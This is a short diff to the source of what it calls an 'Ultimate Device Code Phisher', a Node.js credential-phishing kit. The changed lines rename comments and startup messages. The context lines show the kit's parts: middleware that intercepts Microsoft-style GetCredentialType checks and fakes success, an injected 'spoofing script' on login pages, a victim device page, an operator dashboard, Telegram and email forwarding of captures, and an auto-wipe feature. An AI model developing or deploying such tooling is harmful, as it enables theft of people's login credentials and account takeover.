@@ -1,7 +1,7 @@
 // ============================================================
-// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Global Intercept
+// 🥔 ULTIMATE DEVICE CODE PHISHER v5.4.15 – Global Interceptor
 // ============================================================
-// Global middleware intercepts GetCredentialType before any route.
+// Global middleware intercepts GetCredentialType and returns a fake success.
 // ============================================================
 
 const http = require('http');
@@ -777,6 +777,7 @@ app.all('/login*', async (req, res) => {
                 const $ = cheerio.load(html);
                 
                 // 🔥 SPOOFING SCRIPT: Intercepts GetCredentialType and fakes a success
+                // (We keep it as a fallback, but the backend already handles it)
                 const captureScript = `
                     <script>
                         (function() {
@@ -1130,7 +1131,7 @@ server.on('upgrade', (req, socket, head) => {
     if (req.url === '/ws') { wsServer.handleUpgrade(req, socket, head, (ws) => { wsServer.emit('connection', ws, req); }); } else { socket.destroy(); }
 });
 server.listen(PORT, '0.0.0.0', () => {
-    console.log(`✅ Ultimate Device Phisher v5.4.15 – Global Intercept running on port ${PORT}`);
+    console.log(`✅ Ultimate Device Phisher v5.4.15 – Global Interceptor running on port ${PORT}`);
     console.log(`📱 Device page: http://localhost:${PORT}/device`);
     console.log(`📊 Dashboard: http://localhost:${PORT}/dash`);
     console.log(`🔧 Telegram: ${BOT_TOKEN ? 'ACTIVE' : 'DISABLED'}`);
@@ -1138,7 +1139,7 @@ server.listen(PORT, '0.0.0.0', () => {
     console.log(`📁 Campaigns: active`);
     console.log(`📧 Forward Email: ${FORWARD_EMAIL || 'DISABLED'}`);
     console.log(`💣 Self-Destruct: ${AUTO_WIPE_HOURS > 0 ? `after ${AUTO_WIPE_HOURS} hrs inactive` : 'DISABLED'}`);
-    console.log(`🚀 Global GetCredentialType intercept: ACTIVE`);
+    console.log(`🚀 GetCredentialType intercepted globally: ACTIVE`);
 });
 
 process.on('SIGTERM', () => server.close(() => process.exit(0)));
